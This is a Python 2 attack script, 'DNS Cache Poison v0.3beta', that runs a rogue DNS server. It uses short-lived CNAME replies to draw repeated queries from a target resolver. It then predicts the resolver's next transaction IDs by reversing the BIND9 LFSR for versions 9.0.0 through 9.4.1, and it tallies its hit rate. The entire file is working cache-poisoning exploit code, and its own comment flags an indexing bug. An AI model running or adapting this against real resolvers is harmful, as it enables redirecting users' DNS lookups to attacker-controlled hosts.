#!/usr/bin/env python

"""
DNS Cache Poison v0.3beta by posedge
based on the Amit Klein paper: http://www.trusteer.com/docs/bind9dns.html

output: <time>:<ip>:<port>: id: <id> q: <query> g: <good> e: <error>

id: ID to predict
q: number of queries from the DNS server (only queries with LSB at 0 in ID)
g: number of good predicted IDs
e: number of errors while trying to predict a *supposed to be* predicted ID
"""

import socket, select, sys, time
from struct import unpack, pack
from socket import htons

_ANSWER_TIME_LIMIT = 1.0  # 1sec
_NAMED_CONF = [[ 'hacker', '192.168.108.5']]

class BINDSimplePredict:
    def __init__(self, txid, bind_9_2_3___9_4_1=True):
        self.txid = txid
        self.cand = []
        if bind_9_2_3___9_4_1 == True:
            # For BIND9 v9.2.3-9.4.1:
            self.tap1 = 0x80000057
            self.tap2 = 0x80000062
        else:
            # For BIND9 v9.0.0-9.2.2:
            self.tap1 = 0xc000002b  # (0x80000057>>1)|(1<<31)
            self.tap2 = 0xc0000061  # (0x800000c2>>1)|(1<<31)
        self.next = self.run()
        return

    def run(self):

        if (self.txid & 1) != 0:
            # print "info: LSB is not 0. Can't predict the next transaction ID."
            return False

        # print "info: LSB is 0, predicting..."

        # One bit shift (assuming the two lsb's are 0 and 0)
        for msb in xrange(0, 2):
            self.cand.append(((msb << 15) | (self.txid >> 1)) & 0xFFFF)

        # Two bit shift (assuming the two lsb's are 1 and 1)
        # First shift (we know the lsb is 1 in both LFSRs):
        v = self.txid
        v = (v >> 1) ^ self.tap1 ^ self.tap2
        if (v & 1) == 0:
            # After the first shift, the lsb becomes 0, so the two LFSRs now have
            # identical lsb's: 0 and 0 or 1 and 1
            # Second shift:
            v1 = (v >> 1)  # 0 and 0
            v2 = (v >> 1) ^ self.tap1 ^ self.tap2  # 1 and 1
        else:
            # After the first shift, the lsb becomes 1, so the two LFSRs now have
            # different lsb's: 1 and 0 or 0 and 1
            # Second shift:
            v1 = (v >> 1) ^ self.tap1  # 1 and 0
            v2 = (v >> 1) ^ self.tap2  # 0 and 1

        # Also need to enumerate over the 2 msb's we are clueless about
        for msbits in xrange(0, 4):
            self.cand.append(((msbits << 14) | v1) & 0xFFFF)
            self.cand.append(((msbits << 14) | v2) & 0xFFFF)

        return True;


class DNSData:
    def __init__(self, data):
        self.data = data
        self.name = ''

        for i in xrange(12, len(data)):
            self.name += data[i]
            if data[i] == '\x00':
                break
        q_type = unpack(">H", data[i + 1:i + 3])[0]
        if q_type != 1:  # only type: A (host address) allowed.
            self.name = None
        return

    def response(self, ip=None):
        packet = ''
        packet += self.data[0:2]  # id
        packet += "\x84\x10"  # flags
        packet += "\x00\x01"  # questions
        packet += "\x00\x01"  # answer RRS
        packet += "\x00\x00"  # authority RRS
        packet += "\x00\x00"  # additional RRS
        packet += self.name  # queries: name
        packet += "\x00\x01"  # queries: type (A)
        packet += "\x00\x01"  # queries: class (IN)
        packet += "\xc0\x0c"  # answers: name
        if ip == None:
            packet += "\x00\x05"  # answers: type (CNAME)
            packet += "\x00\x01"  # answers: class (IN)
            packet += "\x00\x00\x00\x01"  # answers: time to live (1sec)
            packet += pack(">H", len(self.name) + 2)  # answers: data length
            packet += "\x01" + "x" + self.name  # answers: primary name
        else:
            packet += "\x00\x01"  # answers: type (A)
            packet += "\x00\x01"  # answers: class (IN)
            packet += "\x00\x00\x00\x01"  # answers: time to live (1sec)
            packet += "\x00\x04"  # answers: data length
            packet += str.join('', map(lambda x: chr(int(x)), ip.split('.')))  # IP
        # packet+="\x00\x00\x29\x10\x00\x00\x00\x00\x00\x00\x00" # Additional
        return packet


class DNSServer:
    def __init__(self):
        self.is_r = []
        self.is_w = []
        self.is_e = []
        self.targets = []
        self.named_conf = []

        print "DNSServer"

        for i in xrange(len(_NAMED_CONF)):
            start = 0
            tmp = ''
            for j in xrange(len(_NAMED_CONF[i][0])):
                if _NAMED_CONF[i][0][j] == '.':
                    tmp += chr(j - start)
                    tmp += _NAMED_CONF[i][0][start:j]
                    start = j + 1
            tmp += chr(j - start + 1)
            tmp += _NAMED_CONF[i][0][start:] + "\x00"
            self.named_conf.append([tmp, _NAMED_CONF[i][1]])
        return

    def run(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.bind(('', 53))
        self.is_r.append(self.s)
        next = False
        i = 0

        while 1:
            r, w, e = select.select(self.is_r, self.is_w, self.is_e, 1.0)
            if r:
                try:
                    data, addr = self.s.recvfrom(1024)
                except socket.error:
                    continue

                txid = unpack(">H", data[0:2])[0]
                p = DNSData(data)
                if p.name == None:
                    continue

                found = False

                for j in xrange(len(self.named_conf)):
                    if p.name == self.named_conf[j][0]:
                        found = True
                        break

                if found == True:
                    self.s.sendto(p.response(self.named_conf[j][1]), addr)
                    continue

                # FIXME: wrong code, 'i' is 0 at begin and when 1 item in list...
                for i in xrange(len(self.targets)):
                    if self.targets[i][0] == addr[0]:
                        break
                if i == len(self.targets):
                    self.targets.append([addr[0], False, time.time(), [None, None], \
                                         None, 0, 0, 0])

                if self.targets[i][1] == False:
                    bsp = BINDSimplePredict(txid)
                    self.targets[i][1] = bsp.next
                    self.targets[i][3][0] = bsp.cand
                    bsp = BINDSimplePredict(txid, False)
                    self.targets[i][3][1] = bsp.cand
                else:
                    if p.name == self.targets[i][4]:
                        elapsed = time.time() - self.targets[i][2]
                        if elapsed > _ANSWER_TIME_LIMIT:
                            print 'info: slow answer, discarding (%.2f sec)' % elapsed
                        else:
                            self.targets[i][5] += 1
                            found_v1 = False
                            found_v2 = False
                            for j in xrange(10):
                                if self.targets[i][3][0][j] == txid:
                                    found_v1 = True
                                    break
                                if self.targets[i][3][1][j] == txid:
                                    found_v2 = True
                                    break

                            if found_v1 == True or found_v2 == True:
                                self.targets[i][6] += 1
                            else:
                                self.targets[i][7] += 1

                            # TODO: if found_v1 or found_v2 is True, then show bind version!
                            print "\n" + str(i) + ' target:', self.targets
                            print '%f:%s:%d: id: %04x q: %d g: %d e: %d' % (time.time(), \
                                                                            addr[0], addr[1], txid, self.targets[i][5], \
                                                                            self.targets[i][6], self.targets[i][7])
                            self.targets[i][1] = False
                self.targets[i][2] = time.time()
                self.targets[i][4] = "\x01" + "x" + p.name
                self.s.sendto(p.response(), addr)
        return

    def close(self):
        self.s.close()
        return


if __name__ == '__main__':
    dns_srv = DNSServer()

    try:
        dns_srv.run()
    except KeyboardInterrupt:
        print 'ctrl-c, leaving...'
        dns_srv.close()